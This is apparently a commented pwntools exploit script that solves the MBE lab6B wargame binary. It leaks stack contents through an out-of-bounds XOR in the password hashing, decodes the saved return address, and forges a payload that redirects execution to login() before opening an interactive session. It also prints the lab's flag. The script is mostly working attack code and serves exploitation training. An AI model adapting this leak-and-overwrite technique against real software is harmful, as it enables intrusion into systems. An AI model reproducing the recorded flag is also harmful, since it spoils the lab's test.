# Based on https://github.com/Corb3nik/MBE-Solutions/blob/master/lab6b/solution.py
from pwn import *

# == How to use ==
# python remote.py LOCAL
# python remote.py REMOTE IP=127.0.0.1 PORT=1337
# Flag : strncpy_1s_n0t_s0_s4f3_l0l

settings = {

    # Path to binary
    "binary"        : "./lab6B",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    payload = "C" * 0x48 # 32DEC is enough, though
    p.sendlineafter("Enter your username: ", payload)
    payload = xor("\x11" * 0x20)  
    # 0x43 ('C') XOR 0x11 = 0x52 (so 0x52 is 
    # the XOR key we encode the stack with before reading it via leak)
    p.sendlineafter("Enter your password: ", payload)
	
    p.recvuntil("Authentication failed for user ")

    # Analyze leaks
    leak = p.recvline()
	
	# Some verbose output for debugging/troubleshooting purpose 
    # (this is redundant with context.log_level='debug' though).
    print("This is the recvline literally printed:") 
    print(leak)
    print("recvline.size:" + str(len(leak)))
    print("recvline.type:" + str(type(leak)))
	# All these here come XOR-ed with 0x52 (0x43 XOR 0x11)
    # because we already messed them up in the memory with 
    # the first payload that eliminated any nulbytes between 
    # the username/password buffers in this state the program
    # is doomed to crash after two more failed attempts
    # (saved ret XOR-ed with 0xda).
	
    username = leak[:0x20]
    hashed_password = leak[0x20:0x40]
    xored_result_val = u32(leak[0x40:0x44])
    xored_attempts = u32(leak[0x44:0x48])
    xored_garbage = u64(leak[0x48:0x50])
    xored_old_ebp = u32(leak[0x50:0x54])
    xored_ret = u32(leak[0x54:0x58])

	# Now let's decode the values back to their original states:
	# 0x52525252 is the XOR key for the leak, because password buffer
    # became: 0x43 ('C') XOR 0x11 = 0x52.
	# Then, then next bytes on the stack (up to 32 unless there is a nullbyte 
    # earlier) after the password buffer were XOR-ed with the contents of the 
    # password buffer, hence 0x52525252 is the XOR key here.
	
    ret = xored_ret ^ 0x52525252
    old_ebp = xored_old_ebp ^ 0x52525252
    garbage = xored_garbage ^ 0x52525252
    result_val = xored_result_val ^ 0x52525252
	
    print("saved RET: %x",hex(ret))
    print("saved EBP: %x",hex(old_ebp))


    # Now, second 'authentication' attempt, this time to attain execution control 
    # by once again filling both buffers with 32 bytes of non-NULL values. 
    # Once again values on the stack below username and password buffers will get 
    # XOR-ed with the of password we supply in the payload, right after it gets 
    # XOR-ed with the value of the username we supply with it.
    # This time we use 'D' as username, to emphasize that it can be different this time.
    payload = "D" * 0x21 # 0x20 is enough here, though
    p.sendlineafter("Enter your username: ", payload)
	
    # Now it's crucial to craft the second password value we provide in our second 
    # payload, so after another hash_pass() call with arbitrary values we want it to be.

    # Calculating the base from the dexored ret and adding the login() offset to it:
    base = (ret) & 0xfffff000
    new_ret = base + 0xaf4
    print("new RET: %x", hex(new_ret))
	
	## To craft an arbitrary new RET (the address of the login() function),\
    # we XOR the current leaked saved ret (which is equal to the original 
    # saved RET value XOR-ed with 0x52) with our new wanted saved RET (login()) here.
	# This way when these two are XOR-ed again by hash_password() call, 
    # the result becomes what we want it to be (login()).
    # So this, once xored again with xored_ret, becomes our new EIP!
    new_ret_payload = new_ret ^ xored_ret 				
		
	# Now the attempts value. It cannot be simply passed back, it will make us end up 
    # with value 1, making that while pretty much an infinite loop.
	# So, instead, we decode it, increment it and encode it back:
    attempts = xored_attempts ^ 0x52525252
    attempts = attempts+1
    xored_attempts = attempts ^ 0x52525252


	# And finally, before putting our values into the password payload,
    # we still need to XOR them with 'D's (0x44) because this is what we
    # are filling the username buffer with this time. hash_password() will perform
    # XOR of the password buffer with the contents of the username buffer, so we 
    # prexor them with 'D's while the hash_password() call will reverse this process,
    # making them values we want them to be before when the password buffer is used 
    # to XOR the following (32 or less depending on where the first null is) bytes 
    # on the stack.
    
    new_result_val = result_val^0x44444444	
    new_attempts=xored_attempts^ 0x44444444
    new_garbage = garbage^0x4444444444444444
    new_old_ebp = old_ebp^0x44444444

    new_ret_payload = new_ret_payload ^ 0x44444444
	

    payload = p32(new_result_val)
    payload+= p32(new_attempts)
    payload+= p64(new_garbage)
    payload+= p32(new_old_ebp)
    payload+= p32(new_ret_payload)
	
	# Fill the reamining bytes with something non-null, 
    # so the out-of-bounds XOR happens again (otherwise we would not be able 
    # to re-XOR the saved RET again and the exploit would fail, crashing the app).
    payload=payload.ljust(0x20,"E")

    p.sendlineafter("Enter your password: ", payload)
	

    p.recvuntil("Authentication failed for user ")
    p.sendline("")
    p.sendline("")
    p.clean()
	
    p.interactive()

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])
		
    p = remote('127.0.0.1', int(6642))
    #p = process(binary.path)
    print("The pid is: "+str(pidof(p)))
    pause()
    exploit()
